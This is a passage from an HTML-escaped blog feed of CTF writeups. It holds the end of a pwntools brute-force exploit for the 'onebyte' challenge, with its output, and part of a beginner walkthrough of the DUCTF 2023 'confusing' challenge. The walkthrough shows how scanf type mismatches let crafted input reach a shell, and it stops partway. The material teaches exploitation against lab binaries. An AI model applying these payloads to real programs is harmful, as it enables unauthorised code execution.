+    &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;win_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x42&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x44&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;bruteforce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;binary_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;binary_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;match&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;EOFError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;pass&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;
+
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;__main__&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bruteforce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/home/kali/onebyte&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;whoami&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;kali&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;KeyboardInterrupt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;pass&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Output:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ python3 onebyte.py
+[+] Starting local process &apos;/bin/sh&apos;: pid 201818
+[*] Stopped process &apos;/bin/sh&apos; (pid 201818)
+[+] Starting local process &apos;/bin/sh&apos;: pid 201821
+[*] Stopped process &apos;/bin/sh&apos; (pid 201821)
+...
+Your turn: kali
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><summary type="html">This writeup will explain how to exploit the “onebyte” CTF challenge.</summary></entry><entry><title type="html">DUCTF 2023 writeup for ‘confusing’</title><link href="http://localhost:4000/2023/09/07/DUCTF-Writeup-confusing.html" rel="alternate" type="text/html" title="DUCTF 2023 writeup for ‘confusing’" /><published>2023-09-07T00:00:00-04:00</published><updated>2023-09-07T00:00:00-04:00</updated><id>http://localhost:4000/2023/09/07/DUCTF-Writeup-confusing</id><content type="html" xml:base="http://localhost:4000/2023/09/07/DUCTF-Writeup-confusing.html">&lt;p&gt;This walkthrough will analyze the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;confusing&lt;/code&gt; challenge from Down Under CTF 2023. This approach will take “the hard way,” opting to analyze the lower-level details behind the official solution to the challenge. The intention is to provide a methodology behind the answer, to explain the low-level details behind each problem, and to explain Python’s pwntools and struct packages a little more in depth.&lt;/p&gt;
+
+&lt;p&gt;Although this was a “beginner” challenge, there is a lot of insight into how &lt;em&gt;scanf&lt;/em&gt; works and how C stores data in memory. The intended audience is that of a beginner for binary exploitation. However, this may prove valuable to anyone who is interested in how the lower-level details of C and Assembly work, and how Python, as a tool for exploitation, is most effective once you have a stronger understanding of these foundations.&lt;/p&gt;
+
+&lt;h1 id=&quot;the-problem&quot;&gt;The Problem&lt;/h1&gt;
+
+&lt;p&gt;The problematic code is here:&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;kt&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;double&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 
+
+    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Give me d: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%lf&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Give me s: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%d&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Give me f: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%8s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;z&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;13337&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6180339887&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strncmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;FLAG&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Our goal is to set all four variables to the values specified within the &lt;em&gt;if&lt;/em&gt; statement—this gives us a shell, direct access to the system. However, the use of improper format specifiers means that you cannot explicitly enter those target values into the terminal or STDIN. Further, there is no way to explicitly set the value of &lt;em&gt;z&lt;/em&gt;.&lt;/p&gt;
+
+&lt;h1 id=&quot;the-strategy&quot;&gt;The Strategy&lt;/h1&gt;
+
+&lt;p&gt;For now, let’s forego the official solution. Their answer is fantastic, but it takes some of the fun out of the exercise. Instead, we will focus on the methodology as though this were an exercise in vulnerability research.&lt;/p&gt;
+
+&lt;p&gt;The key to the solution is knowing that C will implicity accept bytes and store data based on that input. The application will accept raw bytes via STDIN. (Python’s &lt;em&gt;pwntools&lt;/em&gt; and &lt;em&gt;struct&lt;/em&gt; packages will make this process very easy, but they are not strictly needed, as we will see later.)&lt;/p&gt;
+
+&lt;p&gt;With that in mind, we can execute the &lt;em&gt;system&lt;/em&gt; function, and get the shell, by sending the bytes representation for each of the following situations:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Convert &lt;em&gt;13337&lt;/em&gt; to a long double (signed, 64 bits)&lt;/li&gt;
+  &lt;li&gt;Convert &lt;em&gt;FLAG&lt;/em&gt; to a 32-bit integer&lt;/li&gt;
+  &lt;li&gt;Convert &lt;em&gt;1.6180339887&lt;/em&gt; to an 8-byte (unsigned 64-bit) array&lt;/li&gt;
+  &lt;li&gt;Thorugh some means, set the value of &lt;em&gt;z&lt;/em&gt; to &lt;em&gt;-1&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Let’s analyze the compiled binary’s hardening:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ python3
+Python 3.11.4 (main, Jun  7 2023, 10:13:09) [GCC 12.2.0] on linux
+Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
+&amp;gt;&amp;gt;&amp;gt; from pwn import ELF
+&amp;gt;&amp;gt;&amp;gt; ELF(&apos;confusing&apos;)
+[*] &apos;/home/kali/confusing&apos;
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+ELF(&apos;/home/kali/confusing&apos;)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This gives us some key information. First, becuase the binary is “hardened enough,” we probably don’t need an esoteric or truly brilliant attack; in fact, we can probably solve this by sending the encoded conversions to STDIN. Second, because this binary is little endian (&lt;em&gt;amd-64-&lt;strong&gt;little&lt;/strong&gt;&lt;/em&gt;), we will need to ensure that all bytes are “reversed” prior to sending them. Finally, the architecture is 64 bits (&lt;strong&gt;amd64&lt;/strong&gt;), which means that any &lt;em&gt;double&lt;/em&gt; values will have 64-bit precision.&lt;/p&gt;
+
+&lt;h1 id=&quot;setting-d-to-13337&quot;&gt;Setting d to 13337&lt;/h1&gt;
+
+&lt;p&gt;The first conversion will accept eight bytes from STDIN and store the last two inside the short (2 byte) integer &lt;em&gt;d&lt;/em&gt;.&lt;/p&gt;
+
+&lt;p&gt;First, let’s convert &lt;em&gt;13337&lt;/em&gt; to hex.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; hex(13337)
+&apos;0x3419&apos;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This resolves to a two-byte value, &lt;em&gt;0x3419&lt;/em&gt;. Because we are working with little endian, we need to reverse these two bytes (becoming &lt;em&gt;0x1934&lt;/em&gt;), and send this at the very beginning of the byte payload.&lt;/p&gt;
+
+&lt;p&gt;Before going any further, let’s see how &lt;em&gt;pwntools&lt;/em&gt; can support this task. The &lt;em&gt;p16&lt;/em&gt; function will take some decimal input and convert it to a two-byte value. (We use the &lt;em&gt;hexlify&lt;/em&gt; function only to illustrate the hex representation.)&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; from binascii import hexlify
+&amp;gt;&amp;gt;&amp;gt; p16(13337)
+b&apos;\x194&apos;
+&amp;gt;&amp;gt;&amp;gt; hexlify(p16(13337))
+b&apos;1934&apos;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So, the first two bytes are &lt;em&gt;0x1934&lt;/em&gt;. Recall that the format specifier &lt;em&gt;%lf&lt;/em&gt; refers to a &lt;em&gt;long double&lt;/em&gt;, which is 64 bits, or 8 bytes. This leaves 6 bytes remaining.&lt;/p&gt;
+
+&lt;p&gt;For now, we just want to focus on setting &lt;em&gt;d&lt;/em&gt;, so only the first two bytes in the payload are relevant. The remaining six bytes can just be NOP characters, encoded as &lt;em&gt;0x90&lt;/em&gt;. We can construct the payload in the correct format:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; hexlify(p16(13337) + b&apos;\x90\x90\x90\x90\x90\x90&apos;)
+b&apos;1934909090909090&apos;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Thus, if we send &lt;em&gt;0x1934909090909090&lt;/em&gt; as a double, we should be able to set &lt;em&gt;d&lt;/em&gt; to &lt;em&gt;0x3419&lt;/em&gt;, or &lt;em&gt;13337&lt;/em&gt;.&lt;/p&gt;
+
+&lt;p&gt;As an exercise, you could do this conversion manually, but you’ll need to note a few things things. First, recall that the application will read this value “backwards,” so you’ll need to work with the value &lt;em&gt;0x9090909090903419&lt;/em&gt;. Second, you’ll need to review (or teach yourself) &lt;a href=&quot;https://towardsdatascience.com/binary-representation-of-the-floating-point-numbers-77d7364723f1&quot;&gt;how floating-point values are stored in memory&lt;/a&gt; and, thus, in &lt;em&gt;binary&lt;/em&gt;. You could also use an &lt;a href=&quot;https://www.binaryconvert.com/result_double.html?hexadecimal=9090909090903419&quot;&gt;hex-to-double converter&lt;/a&gt;, making sure to provide the “reversed” number.&lt;/p&gt;
+
+&lt;p&gt;However, in Python, we can just use the &lt;em&gt;unpack&lt;/em&gt; method. Per the documentation:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Unpack from the buffer &lt;em&gt;buffer&lt;/em&gt; (presumably packed by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pack(format, ...)&lt;/code&gt;) according to the format string &lt;em&gt;format&lt;/em&gt;.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;We can look up the format string for a &lt;em&gt;double&lt;/em&gt; in the official docs: https://docs.python.org/3/library/struct.html#format-characters. In this case, a double has the format string &lt;em&gt;d&lt;/em&gt;, and defaults to an 8-byte value. This should be sufficient for our payload.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; struct.unpack(&apos;d&apos;, p16(13337) + b&apos;\x90\x90\x90\x90\x90\x90&apos;)
+(-6.828527034388119e-229,)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Note that the result is a tuple. This is explicit in the docs:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;The result is a tuple even if it contains exactly one item.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Since we are only operating on one value, we can take it from the resultant tuple, and convert that value to a string.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; struct.unpack(&apos;d&apos;, p16(13337) + b&apos;\x90\x90\x90\x90\x90\x90&apos;)[0]
+-6.828527034388119e-229
+&amp;gt;&amp;gt;&amp;gt; str(struct.unpack(&apos;d&apos;, p16(13337) + b&apos;\x90\x90\x90\x90\x90\x90&apos;)[0])
+&apos;-6.828527034388119e-229&apos;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This gives us something that we can send to the application via STDIN.&lt;/p&gt;
+
+&lt;p&gt;To test our conversion, we can write a snippet of C code:&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%lf&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;You entered:  0x%x  %d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This will print both the hex and integer representations of the target value, &lt;em&gt;d&lt;/em&gt;.&lt;/p&gt;
+
+&lt;p&gt;Compile and send the payload:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ gcc test.c
+$ echo &apos;-6.828527034388119e-229&apos; | ./a.out
+You entered:  0x3419  13337
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We will circle back to the official answer for this part. For now, know that we have successfully set &lt;em&gt;d&lt;/em&gt; to &lt;em&gt;13337&lt;/em&gt;. The first hurdle is overcome: three more to go.&lt;/p&gt;
+
+&lt;h1 id=&quot;setting-s-to-flag&quot;&gt;Setting s to FLAG&lt;/h1&gt;
+
+&lt;p&gt;The next piece of logic is this:&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%d&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+		&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;strncmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;FLAG&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The approach here is much simpler:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Reverse FLAG &amp;amp;rightarrow; GLAF,&lt;/li&gt;
+  &lt;li&gt;Represent each byte in the reversed string as a number, and&lt;/li&gt;
+  &lt;li&gt;Take the 4-byte (32-bit) &lt;em&gt;integer&lt;/em&gt; representation of that hex value.&lt;/li&gt;
+&lt;/ol&gt;
+
